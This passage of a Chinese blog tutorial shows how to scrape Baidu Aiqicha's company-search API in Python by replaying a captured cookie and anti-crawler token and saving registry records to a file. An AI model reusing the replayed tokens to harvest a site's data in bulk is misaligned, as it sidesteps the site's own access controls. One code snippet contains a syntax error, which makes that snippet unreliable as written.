alt="image.png"><br>发现payload基本一致<br>p:代表页数<br>f:代表筛选的数据信息</p><p>4.查看Response包（部分)</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">https<span class="punctuation">:</span><span class="comment">//aiqicha.baidu.com/s/advanceSearchAjax?p=2&amp;s=10&amp;f=%7B%22regCap%22:[%7B%22start%22:5000,%22end%22:0%7D],%22regCapType%22:[%221%22],%22openStatus%22:[%22%E5%BC%80%E4%B8%9A%22]%7D&amp;o=0</span></span><br><span class="line">https<span class="punctuation">:</span><span class="comment">//aiqicha.baidu.com/s/advanceSearchAjax?p=2&amp;s=10&amp;f=%7B%22regCap%22:[%7B%22start%22:5000,%22end%22:0%7D],%22regCapType%22:[%221%22],%22openStatus%22:[%22%E5%BC%80%E4%B8%9A%22]%7D&amp;o=0</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;qType&quot;</span><span class="punctuation">:</span> <span class="number">111</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;queryStr&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;pageNum&quot;</span><span class="punctuation">:</span> <span class="number">3</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;resultList&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;pid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;91770835364651&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;entName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u6d59\u6c5f\u4e49\u94ed\u5efa\u7b51\u52b3\u52a1\u6709\u9650\u516c\u53f8&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;entType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u6709\u9650\u8d23\u4efb\u516c\u53f8(\u81ea\u7136\u4eba\u6295\u8d44\u6216\u63a7\u80a1)&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;validityFrom&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2018-08-22&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;domicile&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u6d59\u6c5f\u7701\u676d\u5dde\u5e02\u94b1\u5858\u65b0\u533a\u4e07\u4e9a\u540d\u57ce2\u5e62715\u5ba4&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;entLogo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;openStatus&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u5f00\u4e1a&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;legalPerson&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u5415\u7956\u5f3a&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;tags&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;logoWord&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u4e49\u94ed\u5efa\u7b51&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;hkLable&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;isHkComp&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;isClaim&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;titleName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u6d59\u6c5f\u4e49\u94ed\u5efa\u7b51\u52b3\u52a1\u6709\u9650\u516c\u53f8&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;titleLegal&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u5415\u7956\u5f3a&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;titleDomicile&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u6d59\u6c5f\u7701\u676d\u5dde\u5e02\u94b1\u5858\u65b0\u533a\u4e07\u4e9a\u540d\u57ce2\u5e62715\u5ba4&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;regCap&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1,011,000,000.0\u4e07&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;scope&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u8bb8\u53ef\u9879\u76ee\uff1a\u623f\u5c4b\u5efa\u7b51\u548c\u5e02\u653f\u57fa\u7840\u8bbe\u65bd\u9879\u76ee\u5de5\u7a0b\u603b\u627f\u5305\uff1b\u5404\u7c7b\u5de5\u7a0b\u5efa\u8bbe\u6d3b\u52a8\uff1b\u7535\u6c14\u5b89\u88c5\u670d\u52a1\uff1b\u5efa\u7b51\u52b3\u52a1\u5206\u5305\uff1b\u4eba\u9632\u5de5\u7a0b\u9632\u62a4\u8bbe\u5907\u5236\u9020(\u4f9d\u6cd5\u987b\u7ecf\u6279\u51c6\u7684\u9879\u76ee\uff0c\u7ecf\u76f8\u5173\u90e8\u95e8\u6279\u51c6\u540e\u65b9\u53ef\u5f00\u5c55\u7ecf\u8425\u6d3b\u52a8\uff0c\u5177\u4f53\u7ecf\u8425\u9879\u76ee\u4ee5\u5ba1\u6279\u7ed3\u679c\u4e3a\u51c6)\u3002\u4e00\u822c\u9879\u76ee\uff1a\u5de5\u7a0b\u7ba1\u7406\u670d\u52a1\uff1b\u4f4f\u5b85\u6c34\u7535\u5b89\u88c5\u7ef4\u62a4\u670d\u52a1\uff1b\u516c\u8def\u6c34\u8fd0\u5de5\u7a0b\u8bd5\u9a8c\u68c0\u6d4b\u670d\u52a1\uff1b\u8f68\u9053\u4ea4\u901a\u4e13\u7528\u8bbe\u5907\u3001\u5173\u952e\u7cfb\u7edf\u53ca\u90e8\u4ef6\u9500\u552e\uff1b\u627f\u63a5\u603b\u516c\u53f8\u5de5\u7a0b\u5efa\u8bbe\u4e1a\u52a1\uff1b\u571f\u77f3\u65b9\u5de5\u7a0b\u65bd\u5de5\uff1b\u56ed\u6797\u7eff\u5316\u5de5\u7a0b\u65bd\u5de5\uff1b\u57ce\u5e02\u7eff\u5316\u7ba1\u7406\uff1b\u82b1\u5349\u7eff\u690d\u79df\u501f\u4e0e\u4ee3\u7ba1\u7406\uff1b\u9632\u8150\u6750\u6599\u9500\u552e\uff1b\u4e94\u91d1\u4ea7\u54c1\u96f6\u552e\uff1b\u4e94\u91d1\u4ea7\u54c1\u6279\u53d1\uff1b\u91d1\u5c5e\u6750\u6599\u9500\u552e\uff1b\u5efa\u7b51\u6750\u6599\u9500\u552e\uff1b\u6d82\u6599\u5236\u9020\uff08\u4e0d\u542b\u5371\u9669\u5316\u5b66\u54c1\uff09\uff1b\u91d1\u5c5e\u7ed3\u6784\u9500\u552e\uff1b\u5efa\u7b51\u7528\u94a2\u7b4b\u4ea7\u54c1\u9500\u552e\uff1b\u91d1\u5c5e\u7ed3\u6784\u5236\u9020(\u9664\u4f9d\u6cd5\u987b\u7ecf\u6279\u51c6\u7684\u9879\u76ee\u5916\uff0c\u51ed\u8425\u4e1a\u6267\u7167\u4f9d\u6cd5\u81ea\u4e3b\u5f00\u5c55\u7ecf\u8425\u6d3b\u52a8)\u3002&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;regNo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;91320322MA1X36PF3D&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;appJumpUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;aiqicha:\/\/open.app?params=&#123;\&quot;naModule\&quot;:\&quot;\/aqc\/detail\&quot;,\&quot;naParam\&quot;:\&quot;&#123;\\\&quot;pid\\\&quot;:\\\&quot;91770835364651\\\&quot;&#125;\&quot;&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;labels&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;opening&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u5f00\u4e1a&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;style&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blue&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;fontColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#1EA830&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;bgColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#EBF7EC&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;personTitle&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u6cd5\u5b9a\u4ee3\u8868\u4eba&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;personId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0fa179597fa8aaccf6f6ae44062f8a24&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;newLabels&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;opening&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u5f00\u4e1a&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;style&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blue&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;fontColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#1EA830&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;bgColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#EBF7EC&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">]</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p>选取部分字段如<br>“entName”: “\u946b\u6e90\u9e3f\u660a(\u5929\u6d25)\u79d1\u6280\u6709\u9650\u516c\u53f8”,<br>“regCap”: “1,011,000,000.0\u4e07”,</p><p>进行解密:<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011547330.png" alt="image.png"></p><p>发现解密结果对应了页面所要抓取的信息<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011548084.png" alt="image.png"></p><h1 id="3-程序编写"><a href="#3-程序编写" class="headerlink" title="3.程序编写"></a>3.程序编写</h1><p>1.保存访问请求头:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Accept:</span><br><span class="line">application/json, text/plain, */*</span><br><span class="line">Accept-Encoding:</span><br><span class="line">gzip, deflate, br</span><br><span class="line">Accept-Language:</span><br><span class="line">zh-CN,zh;q=0.9</span><br><span class="line">Connection:</span><br><span class="line">keep-alive</span><br><span class="line">Cookie: “抓到的cookie”</span><br><span class="line">Host:</span><br><span class="line">aiqicha.baidu.com</span><br><span class="line">Referer:</span><br><span class="line">https://aiqicha.baidu.com/advancesearch/list</span><br><span class="line">Sec-Ch-Ua:</span><br><span class="line">&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile:</span><br><span class="line">?0</span><br><span class="line">Sec-Ch-Ua-Platform:</span><br><span class="line">&quot;Windows&quot;</span><br><span class="line">Sec-Fetch-Dest:</span><br><span class="line">empty</span><br><span class="line">Sec-Fetch-Mode:</span><br><span class="line">cors</span><br><span class="line">Sec-Fetch-Site:</span><br><span class="line">same-origin</span><br><span class="line">User-Agent:</span><br><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">X-Requested-With:</span><br><span class="line">XMLHttpRequest</span><br><span class="line">Ymg_ssr:</span><br><span class="line">1686132225976_1686209020456_Krd2ws59qA1TALmBzJb0wdzDayRK14xrDbs2NsxGZghPtW2AaG8K4Now6K/zTfBecE9i1aegJL5KTT+cxrK6j9JK2ix9MoT8+qWljBqcj0i1PEU+RTVvgGjdlkPqamJydND6fQSkBidmHrZVhBXKSiqByC1knHzxmFJl0d+FYKOIK5Yue9P/KBLU2Q3FIF1YsrkslH8qYriHAg5MNXzRTlrU4gdLir4fXP++E+JwOUR2jkA8Mv4vTuUOG7crcKk2W+omKed78e4P6vi6j3qgdk6Pc4jel6aItYE8iTIAZCAcJNP4raFja3p6Eb/KAqre</span><br><span class="line">Zx-Open-Url:</span><br><span class="line">https://aiqicha.baidu.com/advancesearch/list</span><br></pre></td></tr></table></figure><p>爬取代码前根据请求头制作headers</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;抓到的cookie&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;aiqicha.baidu.com&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Ch-Ua&#x27;</span>: <span class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Ch-Ua-Mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Ch-Ua-Platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Ymg_ssr&#x27;</span>: <span class="string">&#x27;1686132225976_1686209020456_Krd2ws59qA1TALmBzJb0wdzDayRK14xrDbs2NsxGZghPtW2AaG8K4Now6K/zTfBecE9i1aegJL5KTT+cxrK6j9JK2ix9MoT8+qWljBqcj0i1PEU+RTVvgGjdlkPqamJydND6fQSkBidmHrZVhBXKSiqByC1knHzxmFJl0d+FYKOIK5Yue9P/KBLU2Q3FIF1YsrkslH8qYriHAg5MNXzRTlrU4gdLir4fXP++E+JwOUR2jkA8Mv4vTuUOG7crcKk2W+omKed78e4P6vi6j3qgdk6Pc4jel6aItYE8iTIAZCAcJNP4raFja3p6Eb/KAqre&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Zx-Open-Url&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.构造params参数如图所示</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;p&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;s&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&#123;&quot;regCap&quot;:[&#123;&quot;start&quot;:5000,&quot;end&quot;:0&#125;],&quot;regCapType&quot;:[&quot;1&quot;],&quot;openStatus&quot;:[&quot;开业&quot;]&#125;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;o&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.爬虫实现代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;p&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;s&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&#123;&quot;regCap&quot;:[&#123;&quot;start&quot;:5000,&quot;end&quot;:0&#125;],&quot;regCapType&quot;:[&quot;1&quot;],&quot;openStatus&quot;:[&quot;开业&quot;]&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;o&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;抓到的cookie&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;aiqicha.baidu.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua&#x27;</span>: <span class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Ymg_ssr&#x27;</span>: <span class="string">&#x27;1686132225976_1686209020456_Krd2ws59qA1TALmBzJb0wdzDayRK14xrDbs2NsxGZghPtW2AaG8K4Now6K/zTfBecE9i1aegJL5KTT+cxrK6j9JK2ix9MoT8+qWljBqcj0i1PEU+RTVvgGjdlkPqamJydND6fQSkBidmHrZVhBXKSiqByC1knHzxmFJl0d+FYKOIK5Yue9P/KBLU2Q3FIF1YsrkslH8qYriHAg5MNXzRTlrU4gdLir4fXP++E+JwOUR2jkA8Mv4vTuUOG7crcKk2W+omKed78e4P6vi6j3qgdk6Pc4jel6aItYE8iTIAZCAcJNP4raFja3p6Eb/KAqre&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Zx-Open-Url&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://aiqicha.baidu.com/s/advanceSearchAjax&quot;</span></span><br><span class="line">    response = requests.get(url, headers=headers, params=params)</span><br><span class="line">    resultList = response.json()[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;resultList&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> resultList:</span><br><span class="line">        <span class="built_in">print</span>(item)</span><br><span class="line">        <span class="built_in">print</span>(item[<span class="string">&#x27;entName&#x27;</span>])</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>4.成功爬取结果:<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011550787.png" alt="image.png"></p><p>与browser访问一致<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011551205.png" alt="image.png"></p><p>5.爬取内容后保存至文件中</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">n</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment">#写入文件</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;p&quot;</span>: <span class="string">&quot;1&quot;</span>.</span><br><span class="line">        <span class="string">&quot;s&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&#123;&quot;regCap&quot;:[&#123;&quot;start&quot;:5000,&quot;end&quot;:0&#125;],&quot;regCapType&quot;:[&quot;1&quot;],&quot;openStatus&quot;:[&quot;开业&quot;]&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;o&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;抓到的cookie&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;aiqicha.baidu.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua&#x27;</span>: <span class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Ymg_ssr&#x27;</span>: <span class="string">&#x27;1686132225976_1686209020456_Krd2ws59qA1TALmBzJb0wdzDayRK14xrDbs2NsxGZghPtW2AaG8K4Now6K/zTfBecE9i1aegJL5KTT+cxrK6j9JK2ix9MoT8+qWljBqcj0i1PEU+RTVvgGjdlkPqamJydND6fQSkBidmHrZVhBXKSiqByC1knHzxmFJl0d+FYKOIK5Yue9P/KBLU2Q3FIF1YsrkslH8qYriHAg5MNXzRTlrU4gdLir4fXP++E+JwOUR2jkA8Mv4vTuUOG7crcKk2W+omKed78e4P6vi6j3qgdk6Pc4jel6aItYE8iTIAZCAcJNP4raFja3p6Eb/KAqre&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Zx-Open-Url&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://aiqicha.baidu.com/s/advanceSearchAjax&quot;</span></span><br><span class="line">    response = requests.get(url, headers=headers, params=params)</span><br><span class="line">    result = response.json()[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;resultList&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">        a = <span class="string">&quot;公司名称:&quot;</span>+item[<span class="string">&#x27;entName&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;注册资金:&quot;</span>+item[<span class="string">&#x27;regCap&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司类型:&quot;</span>+item[<span class="string">&#x27;entType&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司成立时间:&quot;</span>+item[<span class="string">&#x27;validityFrom&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司地址:&quot;</span>+item[<span class="string">&quot;domicile&quot;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&#x27;开业状况:&#x27;</span>+item[<span class="string">&quot;openStatus&quot;</span>]+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        f.write(a)</span><br><span class="line"></span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011551558.png" alt="image.png"></p><p>6.爬取多页信息</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">n</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment">#写入文件</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span 